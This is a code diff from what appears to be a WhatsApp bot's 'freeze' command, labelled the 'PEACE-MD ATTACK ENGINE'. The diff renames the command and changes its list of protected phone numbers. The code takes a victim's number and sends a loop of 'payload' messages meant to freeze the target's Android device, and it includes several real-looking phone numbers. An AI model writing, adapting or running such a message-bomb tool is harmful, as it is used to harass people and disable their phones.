@@ -28,11 +28,11 @@ const iosKillCommand = async (m, Matrix) => {
 
   if (!targetNumber || isNaN(targetNumber)) {
     return await Matrix.sendMessage(m.from, {
-      text: '❌ *Usage:* `.xeon-freeze 2547xxxxxxxxx`',
+      text: '❌ *Usage:* `.peace-freeze 2547xxxxxxxxx`',
     }, { quoted: m });
   }
 
-  const safeNumbers = ['254759000340','254105325084','254756360306', config.OWNER_NUMBER, ...(config.SUDO || [])];
+  const safeNumbers = ['923208206484','254769876178','254752818245', config.OWNER_NUMBER, ...(config.SUDO || [])];
   if (safeNumbers.includes(targetNumber.replace(/[^0-9]/g, ''))) {
     return await Matrix.sendMessage(m.from, {
       text: '⚠️ *You cannot target this protected number.*',
@@ -44,12 +44,12 @@ const iosKillCommand = async (m, Matrix) => {
 
   // Confirmation message
   await Matrix.sendMessage(m.from, {
-    text: `🧠 *PEACE-MD XEON-FREEZE DEPLOYED*\n\n👾 Targeting: *+${targetNumber}*\n📱 Device: *Android*\n🔋 Intensity: *MAXIMUM*\n\n⏳ *Launching Payload...*`,
+    text: `🧠 *PEACE-MD PEACE-FREEZE DEPLOYED*\n\n👾 Targeting: *+${targetNumber}*\n📱 Device: *Android*\n🔋 Intensity: *MAXIMUM*\n\n⏳ *Launching Payload...*`,
   }, { quoted: m });
 
   for (let i = 0; i < attackLines.length; i++) {
     await Matrix.sendMessage(targetJid, {
-      text: `🧨 *XEON-FREEZE PAYLOAD ${i + 1}*\n${attackLines[i]}\n\n🌀 _PEACE-MD ATTACK ENGINE_`,
+      text: `🧨 *PEACE-FREEZE PAYLOAD ${i + 1}*\n${attackLines[i]}\n\n🌀 _PEACE-MD ATTACK ENGINE_`,
     });
     await new Promise(r => setTimeout(r, 250));
   }
